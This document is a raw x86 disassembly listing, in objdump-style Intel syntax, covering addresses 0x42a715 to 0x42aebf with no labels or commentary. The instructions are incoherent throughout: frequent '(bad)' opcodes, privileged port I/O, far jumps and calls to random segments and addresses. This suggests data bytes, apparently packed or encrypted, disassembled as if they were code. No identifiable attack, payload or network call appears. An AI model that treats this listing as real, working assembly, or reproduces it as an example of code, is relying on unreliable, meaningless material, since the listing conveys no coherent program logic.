  42a715:	test   DWORD PTR [ecx-0x62a9fa74],0x1f2c434e
  42a71f:	into   
  42a720:	pop    edi
  42a721:	sbb    al,cl
  42a723:	cmp    dh,dh
  42a725:	push   ss
  42a726:	dec    esp
  42a727:	(bad)  
  42a728:	adc    BYTE PTR [ecx-0x3e],bh
  42a72b:	bound  edx,QWORD PTR [edi+0x7c]
  42a72e:	inc    edi
  42a72f:	jno    0x42a6b9
  42a731:	add    eax,0xf0336f52
  42a736:	jmp    0x42a6d1
  42a738:	in     al,dx
  42a739:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a73a:	pushf  
  42a73b:	call   0x153b5630
  42a740:	xchg   ebp,eax
  42a741:	jmp    0x42a6c4
  42a743:	mov    dl,0xf7
  42a745:	add    bh,BYTE PTR [edx+0x64]
  42a748:	sti    
  42a749:	push   ds
  42a74a:	mov    edi,0x55575240
  42a74f:	mov    cl,0xf4
  42a751:	or     ch,BYTE PTR [ebx]
  42a753:	or     BYTE PTR [ebp-0x7d],ah
  42a756:	xchg   edi,eax
  42a757:	dec    esi
  42a758:	hlt    
  42a759:	shl    ebp,0xd7
  42a75c:	xor    eax,0x16b7d084
  42a761:	mov    WORD PTR [esp+eax*4-0x5a],ds
  42a765:	push   ss
  42a766:	add    DWORD PTR [ebx+0x28e4f6e],0xff89f1a7
  42a770:	xor    BYTE PTR [esi],cl
  42a772:	int    0x5d
  42a774:	out    dx,al
  42a775:	mov    WORD PTR [edx-0x53],?
  42a778:	inc    ecx
  42a779:	into   
  42a77a:	jb     0x42a7c5
  42a77c:	ret    
  42a77d:	aam    0x9b
  42a77f:	into   
  42a780:	or     dh,dl
  42a782:	inc    ebp
  42a783:	scas   al,BYTE PTR es:[edi]
  42a784:	(bad)  
  42a785:	out    0xcc,al
  42a787:	cmp    BYTE PTR [eax],bh
  42a789:	add    bh,BYTE PTR [eax-0x1eadc087]
  42a78f:	popf   
  42a790:	push   ebx
  42a791:	pop    DWORD PTR [eax]
  42a793:	in     al,0x65
  42a795:	adc    bh,dl
  42a797:	fmul   DWORD PTR [eax-0x66]
  42a79a:	jbe    0x42a814
  42a79c:	repnz idiv DWORD PTR [edx+0x5bd9e69f]
  42a7a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a7a4:	ret    0xedfe
  42a7a7:	test   DWORD PTR [esi+ebx*4-0x3b89cfbb],eax
  42a7ae:	sti    
  42a7af:	pop    esi
  42a7b0:	add    al,0x6e
  42a7b2:	in     eax,dx
  42a7b3:	in     eax,dx
  42a7b4:	adc    al,0x8e
  42a7b6:	mov    eax,ds:0x44ab8359
  42a7bb:	add    BYTE PTR [ebx-0x1534dc5d],0x37
  42a7c2:	xor    bh,BYTE PTR [esi]
  42a7c4:	xor    DWORD PTR [ecx+0x3d65f0b4],0xffffffdb
  42a7cb:	loop   0x42a7f3
  42a7cd:	add    DWORD PTR [edi],ecx
  42a7cf:	inc    edi
  42a7d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a7d1:	repnz aad 0x45
  42a7d4:	ror    DWORD PTR [esi],1
  42a7d6:	adc    ebx,DWORD PTR [edi+0x27c90da4]
  42a7dc:	into   
  42a7dd:	retf   0x8e79
  42a7e0:	imul   BYTE PTR [esi-0x10]
  42a7e3:	sar    BYTE PTR es:[esi+0x318db1b6],cl
  42a7ea:	dec    ecx
  42a7eb:	or     esp,eax
  42a7ed:	fwait
  42a7ee:	cs or  al,0xee
  42a7f1:	push   eax
  42a7f2:	sub    BYTE PTR [edi+0x2c813bd7],cl
  42a7f8:	in     al,dx
  42a7f9:	jmp    0x38f6dae6
  42a7fe:	mov    al,0x4c
  42a800:	sbb    BYTE PTR [ecx+0x2f5e7191],cl
  42a806:	jecxz  0x42a848
  42a808:	jmp    0x86748fe0
  42a80d:	test   al,0x33
  42a80f:	mov    al,ds:0x4fd343ad
  42a814:	jmp    0xfb36:0xce2106a6
  42a81b:	or     al,0x4e
  42a81d:	sub    DWORD PTR [eax-0xc9217aa],ebp
  42a823:	dec    ebx
  42a824:	imul   ebx,DWORD PTR [ebp-0x4b8e9ee9],0xffffffb3
  42a82b:	ja     0x42a7d3
  42a82d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a82e:	add    DWORD PTR cs:[esi-0x6d],0x7da82524
  42a836:	mov    BYTE PTR [edi-0x5bff655f],bl
  42a83c:	lods   eax,DWORD PTR ds:[esi]
  42a83d:	fadd   DWORD PTR [edi+0xd8338a]
  42a843:	sahf   
  42a844:	push   ebx
  42a845:	fcomip st,st(4)
  42a847:	(bad)  
  42a848:	dec    BYTE PTR [ebx]
  42a84a:	imul   esp,DWORD PTR [ebx-0x6d],0xfffffff1
  42a84e:	ins    DWORD PTR es:[edi],dx
  42a84f:	clc    
  42a850:	pop    edi
  42a851:	push   eax
  42a852:	or     BYTE PTR [eax+0x25],dh
  42a855:	mov    ecx,0x91837095
  42a85a:	push   eax
  42a85b:	and    ah,cl
  42a85d:	mov    ah,0xc
  42a85f:	lea    ecx,[edx-0x27]
  42a862:	data16 test al,0x99
  42a865:	dec    ebx
  42a866:	in     al,0x5f
  42a868:	add    DWORD PTR [edi-0x7c15ac6d],ebx
  42a86e:	inc    ecx
  42a86f:	pusha  
  42a870:	pop    esp
  42a871:	push   esi
  42a872:	cs jnp 0x42a8cc
  42a875:	fnsave cs:[edi-0x48c04fa6]
  42a87c:	lahf   
  42a87d:	sbb    BYTE PTR [edx],cl
  42a87f:	cmp    esi,DWORD PTR [ebx]
  42a881:	stc    
  42a882:	std    
  42a883:	out    dx,eax
  42a884:	test   eax,0x13a00634
  42a889:	loope  0x42a857
  42a88b:	je     0x42a90c
  42a88d:	cs jg  0x42a8fe
  42a890:	fisttp QWORD PTR [esi+0xa97d0c8]
  42a896:	clc    
  42a897:	sbb    edx,DWORD PTR [ecx+0x33058791]
  42a89d:	fbstp  TBYTE PTR [ecx+ebx*8]
  42a8a0:	mov    edx,0xdbe543d7
  42a8a5:	xchg   edi,eax
  42a8a6:	shl    cl,1
  42a8a8:	enter  0xe840,0x32
  42a8ac:	ins    BYTE PTR es:[edi],dx
  42a8ad:	mov    dh,0x63
  42a8af:	or     al,0xf7
  42a8b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a8b2:	xchg   edi,eax
  42a8b3:	sbb    DWORD PTR [ebp-0xc],0x2e
  42a8b7:	enter  0xd85f,0x7a
  42a8bb:	xor    al,0x88
  42a8bd:	xor    al,0xed
  42a8bf:	jmp    0x575c:0xde71f248
  42a8c6:	jp     0x42a8f9
  42a8c8:	mov    bh,0x78
  42a8ca:	iret   
  42a8cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a8cc:	lock int 0x84
  42a8cf:	fst    QWORD PTR [ebx-0x43a93c7c]
  42a8d5:	es into 
  42a8d7:	inc    esp
  42a8d8:	inc    esp
  42a8d9:	repz test BYTE PTR [edx+0x571b6b3b],ch
  42a8e0:	shl    dh,1
  42a8e2:	aas    
  42a8e3:	add    ecx,DWORD PTR [ebp-0x16]
  42a8e6:	ficom  DWORD PTR ds:[esi]
  42a8e9:	mov    dl,0x10
  42a8eb:	int    0x2f
  42a8ed:	int    0xf4
  42a8ef:	jp     0x42a963
  42a8f1:	(bad)  
  42a8f3:	pop    esi
  42a8f4:	leave  
  42a8f5:	ret    0x878e
  42a8f8:	test   eax,0x1a804d1e
  42a8fd:	cmp    bh,BYTE PTR ds:0xab3ee1a3
  42a903:	mov    esi,0x9e4a3dbb
  42a908:	adc    ch,BYTE PTR [ebp+0x45a0eb2]
  42a90e:	mov    al,ds:0xcfd675e
  42a913:	in     al,0x71
  42a915:	push   ecx
  42a916:	mov    dl,0x99
  42a918:	(bad)  
  42a919:	(bad)  
  42a91a:	mov    edx,0x1509add3
  42a91f:	jo     0x42a918
  42a921:	push   esi
  42a922:	fisttp WORD PTR ds:0xb8580f84
  42a928:	inc    ecx
  42a929:	mov    esp,0xba363dae
  42a92e:	dec    eax
  42a92f:	dec    ecx
  42a930:	push   es
  42a931:	rcr    ecx,1
  42a933:	mov    eax,ds:0x8080e943
  42a938:	jns    0x42a990
  42a93a:	xor    eax,0xcecd8184
  42a93f:	inc    ebx
  42a940:	mov    cl,0xae
  42a942:	test   al,0x63
  42a944:	and    edx,DWORD PTR [ebx-0x7f]
  42a947:	push   esi
  42a948:	fcomp  QWORD PTR [esi]
  42a94a:	(bad)  
  42a94b:	push   ss
  42a94c:	sub    bh,BYTE PTR [ecx-0x6c81e30c]
  42a952:	lods   al,BYTE PTR ds:[esi]
  42a953:	ret    0xd934
  42a956:	and    al,0x88
  42a958:	jmp    0x42a9d3
  42a95a:	loope  0x42a931
  42a95c:	(bad)  
  42a95d:	adc    ch,ch
  42a95f:	pop    ecx
  42a960:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a961:	data16 ins BYTE PTR es:[edi],dx
  42a963:	push   edi
  42a964:	sub    eax,0x867666fc
  42a969:	ret    0x66f6
  42a96c:	jo     0x42a992
  42a96e:	popf   
  42a96f:	pusha  
  42a970:	xchg   ebp,eax
  42a971:	mov    ds:0x11a08fa2,al
  42a976:	push   edi
  42a977:	jge    0x42a965
  42a979:	push   es
  42a97a:	push   eax
  42a97b:	icebp  
  42a97c:	pop    edx
  42a97d:	lods   eax,DWORD PTR ds:[esi]
  42a97e:	das    
  42a97f:	(bad)
  42a982:	push   esi
  42a983:	mov    ecx,0xc122a033
  42a988:	ret    
  42a989:	push   ecx
  42a98a:	mov    edx,0x94f6494f
  42a98f:	push   ebp
  42a990:	pop    edx
  42a991:	out    0xa0,eax
  42a993:	pop    esp
  42a994:	popa   
  42a995:	and    BYTE PTR [eax-0x635142e6],dl
  42a99b:	test   BYTE PTR [edi-0x64],dh
  42a99e:	aas    
  42a99f:	sbb    edx,DWORD PTR [esi+0x52]
  42a9a2:	imul   DWORD PTR [edx-0x45fa74fc]
  42a9a8:	dec    edi
  42a9a9:	mov    ds:0x905fe0fb,al
  42a9ae:	mov    dh,0x95
  42a9b0:	jmp    DWORD PTR [esp]
  42a9b3:	rol    dl,cl
  42a9b5:	scas   eax,DWORD PTR es:[edi]
  42a9b6:	push   ecx
  42a9b7:	fsub   st,st(4)
  42a9b9:	inc    esp
  42a9ba:	aaa    
  42a9bb:	leave  
  42a9bc:	pop    edi
  42a9bd:	or     DWORD PTR [ecx+0xe],ebx
  42a9c0:	mov    bl,0xf
  42a9c2:	call   0x9cdb5ce9
  42a9c7:	stc    
  42a9c8:	js     0x42aa05
  42a9ca:	in     al,0xa3
  42a9cc:	xchg   edi,eax
  42a9cd:	test   al,0x66
  42a9cf:	xor    BYTE PTR [esi-0x47a4f1b],0xfa
  42a9d6:	adc    edx,DWORD PTR [ebp+0x6f024bd4]
  42a9dc:	int3   
  42a9dd:	call   0xca7e05c6
  42a9e2:	push   0x19
  42a9e4:	cdq    
  42a9e5:	xchg   DWORD PTR [ecx-0x2f],ebx
  42a9e8:	lock inc eax
  42a9ea:	mov    ds:0x35d3245e,eax
  42a9ef:	rcr    BYTE PTR [ebx],1
  42a9f1:	pushf  
  42a9f2:	scas   eax,DWORD PTR es:[edi]
  42a9f3:	lods   al,BYTE PTR ds:[esi]
  42a9f4:	add    eax,0x4df8d4fd
  42a9f9:	mov    ebp,0xa69676ae
  42a9fe:	jnp    0x42a988
  42aa00:	jo     0x42a9f7
  42aa02:	add    esi,DWORD PTR [edi]
  42aa04:	mov    esi,0x505b548f
  42aa09:	cmp    al,dh
  42aa0b:	ins    BYTE PTR es:[edi],dx
  42aa0c:	sbb    DWORD PTR [edi],edx
  42aa0e:	mov    edx,0x6498abd2
  42aa13:	jo     0x42aa5a
  42aa15:	sti    
  42aa16:	daa    
  42aa17:	mov    DWORD PTR [esi],ebx
  42aa19:	dec    edi
  42aa1a:	shl    BYTE PTR [ecx],1
  42aa1c:	sbb    eax,0xdd2ab7ff
  42aa21:	pop    edi
  42aa22:	xchg   ebx,esi
  42aa24:	pop    ss
  42aa25:	iret   
  42aa26:	mov    esi,0x9dae8ef5
  42aa2b:	(bad)  
  42aa2c:	mov    edi,0x126da7f1
  42aa31:	outs   dx,DWORD PTR ds:[esi]
  42aa32:	(bad)  
  42aa33:	cmp    bl,BYTE PTR [ecx-0x4f]
  42aa36:	and    dl,ah
  42aa38:	mov    esi,DWORD PTR [eax+0x2e]
  42aa3b:	cmp    BYTE PTR [esp+ecx*8-0x31a79467],ah
  42aa42:	mov    bh,0x27
  42aa44:	or     al,ah
  42aa46:	jg     0x42aa5c
  42aa48:	jo     0x42aa27
  42aa4a:	or     al,0xc3
  42aa4c:	mov    ah,0xa6
  42aa4e:	mov    bh,0x11
  42aa50:	adc    eax,0xe47be4a
  42aa55:	xor    DWORD PTR [edi+0x359e8637],ebp
  42aa5b:	sub    eax,0x7b85374e
  42aa60:	imul   ebp,DWORD PTR [edi+0x58a7e7d3],0x31b9460c
  42aa6a:	stos   BYTE PTR es:[edi],al
  42aa6b:	iret   
  42aa6c:	in     al,dx
  42aa6d:	jge    0x42aa2c
  42aa6f:	inc    ebx
  42aa70:	xor    bh,BYTE PTR [ecx-0x59697582]
  42aa76:	jmp    0xb090ed49
  42aa7b:	pop    edx
  42aa7c:	imul   ecx,DWORD PTR [edx-0xd],0x24
  42aa80:	mov    esp,0xea575f0f
  42aa85:	mov    esi,0x68e693cf
  42aa8a:	pop    es
  42aa8b:	dec    edx
  42aa8c:	les    eax,FWORD PTR ds:0x907d4458
  42aa92:	nop
  42aa93:	in     al,0xfa
  42aa95:	repz add dl,BYTE PTR [eax]
  42aa98:	repnz cmp cl,ah
  42aa9b:	add    al,0xb2
  42aa9d:	call   0x3957ec80
  42aaa2:	aad    0x90
  42aaa4:	lods   eax,DWORD PTR ds:[esi]
  42aaa5:	lock sbb edi,eax
  42aaa8:	in     al,dx
  42aaa9:	xor    al,0x7
  42aaab:	pop    edx
  42aaac:	push   edx
  42aaad:	mov    ds:0x2d4bd942,al
  42aab2:	aad    0xa5
  42aab4:	sbb    dl,BYTE PTR [esi]
  42aab6:	fidiv  DWORD PTR [esi+0x3e33c1ab]
  42aabc:	dec    esp
  42aabd:	pop    ds
  42aabe:	cmp    DWORD PTR [esi-0x4aa744b6],eax
  42aac4:	fwait
  42aac5:	add    BYTE PTR [edx+0x17],0xf7
  42aac9:	je     0x42aa5e
  42aacb:	les    ecx,FWORD PTR [eax-0x4d098947]
  42aad1:	dec    esp
  42aad2:	packsswb mm3,QWORD PTR [ecx+0x2a]
  42aad6:	out    0xa,eax
  42aad8:	sub    eax,0x8b0507a0
  42aadd:	call   DWORD PTR [ecx+0x6e]
  42aae0:	pop    eax
  42aae1:	jne    0x42ab59
  42aae3:	test   eax,0x10970d3a
  42aae8:	push   0x864a301b
  42aaed:	push   cs
  42aaee:	hlt    
  42aaef:	xchg   esp,eax
  42aaf0:	outs   dx,DWORD PTR ss:[esi]
  42aaf2:	pop    edx
  42aaf3:	and    bl,BYTE PTR [ebx]
  42aaf5:	mov    ah,0xa1
  42aaf7:	(bad)  
  42aaf8:	aam    0x7e
  42aafa:	jl     0x42aab4
  42aafc:	add    esi,DWORD PTR [ebx+0x56745bc2]
  42ab02:	and    DWORD PTR [edx],0xb412f1d
  42ab08:	xor    BYTE PTR [eax+0x44],0x34
  42ab0c:	adc    BYTE PTR [edx],ah
  42ab0e:	xor    al,0x87
  42ab10:	jae    0x42aabd
  42ab12:	(bad)  
  42ab13:	jle    0x42ab03
  42ab15:	out    dx,eax
  42ab16:	icebp  
  42ab17:	push   ds
  42ab18:	retf   
  42ab19:	pop    edx
  42ab1a:	aad    0xcc
  42ab1c:	push   edx
  42ab1d:	inc    esp
  42ab1e:	int3   
  42ab1f:	mov    esi,DWORD PTR [ebp-0x5b]
  42ab22:	lea    ebp,[eax-0x36]
  42ab25:	mov    ds:0xd673a39f,al
  42ab2a:	sub    edi,DWORD PTR [ebx-0x71]
  42ab2d:	rcl    BYTE PTR [ecx-0x58f2bff8],cl
  42ab33:	sti    
  42ab34:	sbb    BYTE PTR [eax-0x71],cl
  42ab37:	popa   
  42ab38:	mov    ds:0x5f54464,eax
  42ab3d:	cmc    
  42ab3e:	dec    ebp
  42ab3f:	cld    
  42ab40:	inc    ebx
  42ab41:	mov    esp,0x7cebd5ab
  42ab46:	imul   ebx,DWORD PTR [eax+0x32],0x27
  42ab4a:	and    eax,ebx
  42ab4c:	ret    0xc945
  42ab4f:	jmp    0xf1f4bbd5
  42ab54:	push   edi
  42ab55:	stos   DWORD PTR es:[edi],eax
  42ab56:	cmp    al,0xea
  42ab58:	adc    al,0xb1
  42ab5a:	add    eax,0x7619fcd8
  42ab5f:	imul   edx,edi,0xfffffff0
  42ab62:	pop    esp
  42ab63:	clc    
  42ab64:	sub    DWORD PTR [edx*8-0x4f26d303],ebp
  42ab6b:	iret   
  42ab6c:	adc    ah,cl
  42ab6e:	ds jl  0x42abad
  42ab71:	pop    ecx
  42ab72:	pop    edx
  42ab73:	jl     0x42ab50
  42ab75:	push   es
  42ab76:	mov    BYTE PTR [edx-0x3062eff2],bh
  42ab7c:	xchg   esi,eax
  42ab7d:	inc    esp
  42ab7e:	or     dl,BYTE PTR [ebx-0x553cd099]
  42ab84:	repz sar BYTE PTR [esi],cl
  42ab87:	xor    DWORD PTR [ebp+eax*4+0x43],0xf97089d1
  42ab8f:	mov    esi,0xf57edd0a
  42ab94:	int3   
  42ab95:	dec    esp
  42ab96:	aaa    
  42ab97:	mov    cl,0xf2
  42ab99:	dec    esi
  42ab9a:	mov    edi,0xccd93828
  42ab9f:	jl     0x42abd7
  42aba1:	imul   ebx,DWORD PTR [ecx],0x61
  42aba4:	cmp    al,0x69
  42aba6:	leave  
  42aba7:	pop    ebp
  42aba8:	pop    es
  42aba9:	adc    BYTE PTR [eiz*4-0x4dde51d7],bl
  42abb0:	fucom  st(0)
  42abb2:	jle    0x42ab4d
  42abb4:	call   0x980e:0x4ac5619f
  42abbb:	cmp    ecx,eax
  42abbd:	mov    dh,0x20
  42abbf:	jo     0x42ac3d
  42abc1:	push   cs
  42abc2:	mov    ebx,0x48760545
  42abc7:	test   eax,0x9f55d3b5
  42abcc:	jns    0x42ac35
  42abce:	and    BYTE PTR [edi+0xc],cl
  42abd1:	cmp    BYTE PTR ds:0xa5d248cd,0x2b
  42abd8:	ss mov bh,cl
  42abdb:	and    DWORD PTR [esi],ecx
  42abdd:	push   ebp
  42abde:	cmp    bh,BYTE PTR [ebx+0x2346f3b8]
  42abe4:	lock in eax,dx
  42abe6:	or     eax,0x57ceaa8c
  42abeb:	pop    edi
  42abec:	out    0x4a,eax
  42abee:	out    0x63,eax
  42abf0:	jecxz  0x42abe5
  42abf2:	imul   DWORD PTR [edi+0x5f7b83fa]
  42abf8:	lds    edx,FWORD PTR [ebp+0x52]
  42abfb:	and    al,0xfa
  42abfd:	adc    eax,0x210eb865
  42ac02:	fst    QWORD PTR [edi+0x40]
  42ac05:	xor    eax,0xdbeefe63
  42ac0a:	inc    eax
  42ac0c:	sbb    ebp,ebx
  42ac0e:	xor    DWORD PTR [ebx*2-0x7cc963b4],edx
  42ac15:	cmp    ecx,DWORD PTR [esi+ecx*1]
  42ac18:	jp     0x42abad
  42ac1a:	mov    ch,0x19
  42ac1c:	push   ds
  42ac1d:	stc    
  42ac1e:	shl    ebp,0x97
  42ac21:	pop    ebx
  42ac22:	cdq    
  42ac23:	fstp   QWORD PTR [eax]
  42ac25:	cmp    edx,DWORD PTR [ebp-0x47c85678]
  42ac2b:	rcr    DWORD PTR [ebx],cl
  42ac2d:	pop    ebp
  42ac2e:	test   esp,0x1257e12a
  42ac34:	sbb    BYTE PTR ds:0x52ab5b43,ah
  42ac3a:	sub    DWORD PTR [ebx-0x3955413b],edx
  42ac40:	test   DWORD PTR [edi],ebx
  42ac42:	mov    WORD PTR ds:[ebp+0x48021f1a],cs
  42ac49:	sar    edi,cl
  42ac4b:	popa   
  42ac4c:	in     eax,dx
  42ac4d:	and    eax,0x15aa4f26
  42ac52:	jo     0x42ac69
  42ac54:	fdivr  DWORD PTR [ecx]
  42ac56:	clc    
  42ac57:	jg     0x42acc9
  42ac59:	int3   
  42ac5a:	cmp    bl,BYTE PTR [ebx-0x54]
  42ac5d:	gs cwde 
  42ac5f:	call   0x8b32:0xa2a2069f
  42ac66:	jle    0x42ac57
  42ac68:	fwait
  42ac69:	cmp    edi,DWORD PTR [eax-0x4939b17d]
  42ac6f:	jmp    0xca85c222
  42ac74:	cs adc eax,0x13907ad8
  42ac7a:	add    al,0x29
  42ac7c:	mov    dh,0xd2
  42ac7e:	dec    esp
  42ac7f:	repz iret 
  42ac81:	mov    eax,ebx
  42ac83:	scas   al,BYTE PTR es:[edi]
  42ac84:	or     edx,0x2c9ae9b0
  42ac8a:	jmp    0x8818:0xab6de4c7
  42ac91:	call   0x1fae:0x972b
  42ac97:	inc    edx
  42ac98:	mov    edx,0x9e56f1e
  42ac9d:	jle    0x42ac7e
  42ac9f:	mov    cl,0x37
  42aca1:	xlat   BYTE PTR ds:[ebx]
  42aca2:	cmp    ah,ah
  42aca4:	xchg   ecx,eax
  42aca5:	loop   0x42ac8c
  42aca7:	pop    ss
  42aca8:	xlat   BYTE PTR ds:[ebx]
  42aca9:	mov    eax,ebp
  42acab:	jmp    0x331d65d3
  42acb0:	inc    esi
  42acb1:	mov    es,WORD PTR ds:0xf5afd34e
  42acb7:	add    edx,DWORD PTR [ebx-0x1822a254]
  42acbd:	aas    
  42acbe:	stos   DWORD PTR es:[edi],eax
  42acbf:	pop    ecx
  42acc0:	mov    cs,WORD PTR [edi+0x55cb4109]
  42acc6:	adc    DWORD PTR [esi-0x656e7290],esp
  42accc:	cdq    
  42accd:	jecxz  0x42acca
  42accf:	je     0x42acb8
  42acd1:	cmp    al,0x8d
  42acd3:	scas   eax,DWORD PTR es:[edi]
  42acd4:	dec    ebp
  42acd5:	jno    0x42ad1d
  42acd7:	push   edx
  42acd8:	pop    ss
  42acd9:	scas   al,BYTE PTR es:[edi]
  42acda:	arpl   WORD PTR [esi*8-0x6935bbec],bp
  42ace1:	dec    ebp
  42ace2:	lods   eax,DWORD PTR ds:[esi]
  42ace3:	or     DWORD PTR [edi-0x7e],esp
  42ace6:	sbb    al,0x6c
  42ace8:	jbe    0x42ad04
  42acea:	jmp    DWORD PTR [eax+0x7fc96b09]
  42acf0:	push   esi
  42acf1:	sub    bl,bl
  42acf3:	add    ebx,DWORD PTR [ecx+0x14badb8]
  42acf9:	sbb    bh,ah
  42acfb:	inc    ecx
  42acfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42acfd:	mov    ds:0xc7649caa,eax
  42ad02:	mov    dl,ch
  42ad04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ad05:	lods   eax,DWORD PTR ds:[esi]
  42ad06:	xchg   esi,eax
  42ad07:	push   es
  42ad08:	or     al,0xee
  42ad0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ad0b:	push   edi
  42ad0c:	xor    al,0xbb
  42ad0e:	ss mov bh,0xa8
  42ad11:	lahf   
  42ad12:	or     esi,DWORD PTR [edx+ecx*8+0x47]
  42ad16:	xchg   DWORD PTR [ecx+0x71a8d4b9],eax
  42ad1c:	pop    eax
  42ad1d:	bnd jle 0x42ace0
  42ad20:	sub    edx,esi
  42ad22:	push   0xd
  42ad24:	out    0x35,eax
  42ad26:	cld    
  42ad27:	into   
  42ad28:	(bad)  
  42ad29:	xor    DWORD PTR [eax-0x139665b3],esp
  42ad2f:	dec    ebp
  42ad30:	sub    bl,BYTE PTR [ebx+edi*2]
  42ad33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ad34:	clc    
  42ad35:	es inc ebx
  42ad37:	mov    ecx,ebx
  42ad39:	sbb    BYTE PTR [eax-0x142e0863],bl
  42ad3f:	test   al,0xbc
  42ad41:	aas    
  42ad42:	adc    eax,0xd8a98421
  42ad47:	or     ebp,esi
  42ad49:	adc    ecx,DWORD PTR [eax+edi*1+0xa10989e]
  42ad50:	pop    esi
  42ad51:	sbb    ah,al
  42ad53:	cmp    eax,0xe4b25134
  42ad58:	loope  0x42ad12
  42ad5a:	mov    bh,BYTE PTR [edi+0x23e1f058]
  42ad60:	xor    ebx,DWORD PTR [edi]
  42ad62:	ror    DWORD PTR [edx-0x2f],1
  42ad65:	cmc    
  42ad66:	xor    al,cl
  42ad68:	adc    al,BYTE PTR [ebx-0x521224f8]
  42ad6e:	test   DWORD PTR [esi+esi*1-0x1d6aa553],ebp
  42ad75:	xor    DWORD PTR [ecx+0x3fdbdab9],ebp
  42ad7b:	outs   dx,BYTE PTR ds:[esi]
  42ad7c:	xor    DWORD PTR [ebp+0x72],edx
  42ad7f:	sub    ch,ah
  42ad81:	enter  0x70db,0x52
  42ad85:	mov    eax,edx
  42ad87:	ins    BYTE PTR es:[edi],dx
  42ad88:	mov    ebx,0x5a98655
  42ad8d:	dec    ecx
  42ad8e:	pop    es
  42ad8f:	push   ebp
  42ad90:	and    DWORD PTR [edi-0x53],edi
  42ad93:	call   0x1157778f
  42ad98:	rol    dh,cl
  42ad9a:	ins    DWORD PTR es:[edi],dx
  42ad9b:	and    eax,0xa74a0976
  42ada0:	pop    ebp
  42ada1:	mov    ah,0x8e
  42ada3:	(bad)  [edi-0x27]
  42ada6:	das    
  42ada7:	sahf   
  42ada8:	sub    ch,BYTE PTR [ebp-0x31db3908]
  42adae:	jle    0x42ade8
  42adb0:	cmc    
  42adb1:	iret   
  42adb2:	retf   0x42c3
  42adb5:	sbb    DWORD PTR [edi+edi*8],edx
  42adb8:	push   0x81cb5442
  42adbd:	mov    esi,0xe0e46914
  42adc2:	jmp    0x596a2ba9
  42adc7:	out    dx,eax
  42adc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42adc9:	pop    ds
  42adca:	call   0xced4:0xec380f70
  42add1:	test   eax,0x89741482
  42add6:	sub    eax,0x10f37969
  42addb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42addc:	jecxz  0x42adf1
  42adde:	mov    al,ds:0xca717e
  42ade3:	and    bl,BYTE PTR [esi]
  42ade5:	jge    0x42ae1f
  42ade7:	scas   al,BYTE PTR es:[edi]
  42ade8:	inc    ecx
  42ade9:	mov    WORD PTR [edx-0x165f9705],cs
  42adef:	xor    eax,0xf901440d
  42adf4:	inc    ebx
  42adf5:	mov    ds:0xed88b8c8,al
  42adfa:	mov    bl,0x42
  42adfc:	lods   al,BYTE PTR ds:[esi]
  42adfd:	mov    edi,0x2044d454
  42ae02:	push   ebp
  42ae03:	addr16 or eax,0x4851413
  42ae09:	add    eax,0x85914dfc
  42ae0e:	and    al,0xb0
  42ae10:	mov    ah,0x8b
  42ae12:	(bad)  
  42ae13:	adc    BYTE PTR [eax+ecx*8+0x75c2ae8c],0x14
  42ae1b:	jg     0x42ae06
  42ae1d:	or     cl,cl
  42ae1f:	xchg   BYTE PTR [esi-0x441b6c44],ah
  42ae25:	dec    ecx
  42ae26:	int3   
  42ae27:	pop    ss
  42ae28:	es jo  0x42ae79
  42ae2b:	test   DWORD PTR [edx],esi
  42ae2d:	ficomp WORD PTR [eax+edi*2]
  42ae30:	jmp    0x42ae29
  42ae32:	or     al,0xb1
  42ae34:	(bad)  
  42ae35:	mov    ds:0x5d4b3474,al
  42ae3a:	push   ds
  42ae3b:	popf   
  42ae3c:	pop    ds
  42ae3d:	inc    ebx
  42ae3e:	xchg   esp,eax
  42ae3f:	inc    ecx
  42ae40:	(bad)  
  42ae41:	rcr    BYTE PTR [eax],cl
  42ae43:	stc    
  42ae44:	xor    ebp,DWORD PTR [edi+0x3a]
  42ae47:	push   ss
  42ae48:	les    ebx,FWORD PTR [ebx-0x25c78a8b]
  42ae4e:	test   eax,0x795ec30
  42ae53:	push   eax
  42ae54:	or     al,0x25
  42ae56:	mov    eax,ds:0xfd18db4d
  42ae5b:	call   0xa7d471f4
  42ae60:	dec    eax
  42ae61:	and    al,ch
  42ae63:	icebp  
  42ae64:	xor    al,0xeb
  42ae66:	int    0x3
  42ae68:	or     ecx,edx
  42ae6a:	pop    ebx
  42ae6b:	imul   ecx,DWORD PTR [edx+0x1ef0a5ea],0xbe02c56a
  42ae75:	push   edx
  42ae76:	push   0x6649217b
  42ae7b:	xor    al,0xa0
  42ae7d:	call   0xa07740b8
  42ae82:	inc    edx
  42ae83:	pushf  
  42ae84:	stos   DWORD PTR es:[edi],eax
  42ae85:	cli    
  42ae86:	jge    0x42ae0c
  42ae88:	pop    ebp
  42ae89:	es and al,0xb5
  42ae8c:	movlps xmm3,QWORD PTR [edx]
  42ae8f:	(bad)  
  42ae90:	das    
  42ae91:	scas   eax,DWORD PTR es:[edi]
  42ae92:	ret    
  42ae93:	mov    edx,0xce553b0f
  42ae98:	push   es
  42ae99:	mov    ch,cl
  42ae9b:	out    0x71,eax
  42ae9d:	sar    esp,1
  42ae9f:	inc    esp
  42aea0:	pcmpeqb mm1,mm3
  42aea3:	cmc    
  42aea4:	ins    DWORD PTR es:[edi],dx
  42aea5:	add    eax,esp
  42aea7:	aas    
  42aea8:	mov    bl,0xe6
  42aeaa:	cmp    al,0x89
  42aeac:	scas   al,BYTE PTR es:[edi]
  42aead:	fsubrp st(2),st
  42aeaf:	pop    ss
  42aeb0:	inc    esi
  42aeb1:	int    0x66
  42aeb3:	and    BYTE PTR [eax+0xe],ch
  42aeb6:	xchg   ecx,eax
  42aeb7:	push   ss
  42aeb8:	cmp    DWORD PTR [edi+eiz*4-0x75],ebx
  42aebc:	add    BYTE PTR [eax-0x58],al
  42aebf:	aaa    
